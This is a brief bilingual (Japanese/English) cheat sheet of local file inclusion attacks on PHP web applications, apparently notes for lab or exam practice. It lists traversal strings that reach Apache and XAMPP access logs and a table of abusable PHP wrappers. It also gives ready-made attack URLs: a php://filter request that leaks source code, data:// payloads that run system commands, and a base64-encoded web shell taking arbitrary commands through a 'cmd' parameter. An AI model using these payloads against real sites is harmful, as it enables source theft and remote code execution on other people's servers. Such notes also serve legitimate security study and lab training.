# LFI
## Apache Log path

apache log 
```
/var/log/apache2/access.log

↓relative path:
../../../../../../../var/log/apache2/access.log
```

xampp apache log
```
C:\xampp\apache\logs\access.log

↓relative path:
../../../../../../../xampp/apache/logs/access.log
```

## PHP Wrapper
Wrapperリスト

| ラッパー         | 危険な理由                 |
| ------------ | --------------------- |
| php://filter | PHPファイルを読める（実行回避可能）   |
| data://      | 任意コードを埋め込める（RCE）      |
| php://input  | POSTデータ内のPHPコードを読み込める |
| phar://      | オブジェクトインジェクション＋RCE    |

### php://filter
phpファイルの中身をみる
```
http://target.site/index.php?page=php://filter/convert.base64-encode/resource=login.php
```
### data:// (RCE snippet)
text/plain
```
http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
```

base64
```
http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```